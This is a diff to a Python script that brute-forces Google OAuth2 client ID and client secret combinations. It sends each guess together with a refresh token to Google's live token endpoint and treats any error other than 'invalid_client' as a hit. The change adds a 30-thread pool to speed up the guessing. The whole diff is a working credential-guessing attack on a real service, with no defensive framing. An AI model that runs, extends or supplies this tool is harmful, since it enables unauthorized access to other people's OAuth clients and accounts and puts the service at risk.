@@ -1,3 +1,4 @@
+import concurrent.futures
 import requests
 
 url = "https://oauth2.googleapis.com/token"
@@ -54,48 +55,51 @@ def generate_suffixes(index=0, current=""):
     for char in suffix_parts[index][1:]:
         yield from generate_suffixes(index + 1, current + char)
 
-print("Starting verification of credential variations...")
-found = False
-count = 0
+def check_combination(client_id, secret):
+    payload = {
+        "client_id": client_id,
+        "client_secret": secret,
+        "refresh_token": refresh_token,
+        "grant_type": "refresh_token"
+    }
+    try:
+        r = requests.post(url, data=payload, timeout=5)
+        res_json = r.json()
+        if "error" in res_json:
+            if res_json["error"] != "invalid_client":
+                return True, client_id, secret, res_json
+        else:
+            return True, client_id, secret, res_json
+    except Exception as e:
+        pass
+    return False, client_id, secret, None
 
-for proj in project_num_variations:
-    for suffix in generate_suffixes():
-        client_id = f"{proj}-{suffix}.apps.googleusercontent.com"
-        for secret in client_secret_variations:
-            count += 1
-            if count % 100 == 0:
-                print(f"Tested {count} combinations...")
-            payload = {
-                "client_id": client_id,
-                "client_secret": secret,
-                "refresh_token": refresh_token,
-                "grant_type": "refresh_token"
-            }
-            try:
-                r = requests.post(url, data=payload, timeout=2)
-                res_json = r.json()
-                if "error" in res_json:
-                    if res_json["error"] != "invalid_client":
-                        # Client was found! (e.g. invalid_grant or success)
-                        print("\n🎉 SUCCESS! Client ID and Secret found:")
-                        print("Client ID:", client_id)
-                        print("Client Secret:", secret)
-                        print("Response:", res_json)
-                        found = True
-                        break
-                else:
-                    print("\n🎉 SUCCESS (200 OK):")
-                    print("Client ID:", client_id)
-                    print("Client Secret:", secret)
-                    print("Response:", res_json)
-                    found = True
-                    break
-            except Exception:
-                pass
-        if found:
-            break
-    if found:
-        break
-
-if not found:
-    print(f"Brute-force complete. Tested {count} combinations. No valid Client ID found.")
+if __name__ == "__main__":
+    print("Starting concurrent verification of credential variations...")
+    tasks = []
+    for proj in project_num_variations:
+        for suffix in generate_suffixes():
+            client_id = f"{proj}-{suffix}.apps.googleusercontent.com"
+            for secret in client_secret_variations:
+                tasks.append((client_id, secret))
+    
+    print(f"Total combinations to test: {len(tasks)}")
+    
+    found = False
+    with concurrent.futures.ThreadPoolExecutor(max_workers=30) as executor:
+        futures = {executor.submit(check_combination, cid, sec): (cid, sec) for cid, sec in tasks}
+        for future in concurrent.futures.as_completed(futures):
+            success, client_id, secret, res_json = future.result()
+            if success:
+                print("\n🎉 SUCCESS! Client ID and Secret found:")
+                print("Client ID:", client_id)
+                print("Client Secret:", secret)
+                print("Response:", res_json)
+                found = True
+                # Cancel remaining futures
+                for f in futures:
+                    f.cancel()
+                break
+                
+    if not found:
+        print("Brute-force complete. No valid Client ID found.")
